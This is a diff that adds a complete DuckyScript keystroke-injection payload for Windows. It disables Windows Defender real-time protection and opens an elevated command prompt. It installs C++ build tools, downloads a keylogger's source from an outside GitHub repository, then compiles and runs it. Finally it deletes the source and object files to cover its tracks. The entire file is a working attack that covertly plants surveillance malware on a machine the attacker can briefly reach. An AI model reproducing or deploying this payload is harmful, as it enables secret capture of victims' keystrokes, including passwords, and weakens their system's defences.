@@ -1,0 +1,86 @@
+DEFAULT_DELAY 100
+
+REM Disable windows defender real time protection
+GUI s
+DELAY 1000
+STRING Windows Security
+DELAY 1000
+ENTER
+DELAY 2000
+ENTER
+DELAY 1000
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 1000
+SPACE
+DELAY 1000
+LEFTARROW
+ENTER
+DELAY 500
+ALT F4
+
+REM Open cmd.exe as admin
+GUI s
+DELAY 1000
+STRING Command Prompt
+DELAY 1000
+SHIFT F10
+DELAY 500
+ENTER
+DELAY 1000
+LEFTARROW
+ENTER
+DELAY 500
+
+REM Download the cpp compiler
+STRING winget install Microsoft.VisualStudio.2022.BuildTools --force --override "--wait --passive --add Microsoft.VisualStudio.Component.VC.Tools.x86.x64 --add Microsoft.VisualStudio.Component.Windows11SDK.22000"
+ENTER
+DELAY 20000
+LEFTARROW
+ENTER
+DELAY 150000
+
+REM Download the keylogger
+STRING explorer "https://github.com/Necterkilo/Keylogger/blob/master/windows/klog_main.cpp"
+ENTER
+DELAY 7500
+CTRL-SHIFT s
+DELAY 2500
+ALT F4
+
+REM Compile the application
+STRING "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\LaunchDevCmd.bat"
+ENTER
+DELAY 1500
+STRING cl %HOMEPATH%\Downloads\klog_main.cpp User32.lib
+ENTER
+DELAY 5000
+
+REM Run the program
+STRING klog_main.exe
+ENTER
+DELAY 500
+ALT F4
+
+REM Open cmd.exe as admin again
+GUI s
+DELAY 1000
+STRING Command Prompt
+DELAY 1000
+SHIFT F10
+DELAY 500
+ENTER
+DELAY 1000
+LEFTARROW
+ENTER
+DELAY 500
+
+REM Clean up
+STRING del "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\klog_main.obj"
+ENTER
+STRING del %HOMEPATH%\Downloads\klog_main.cpp
+ENTER
+ALT F4
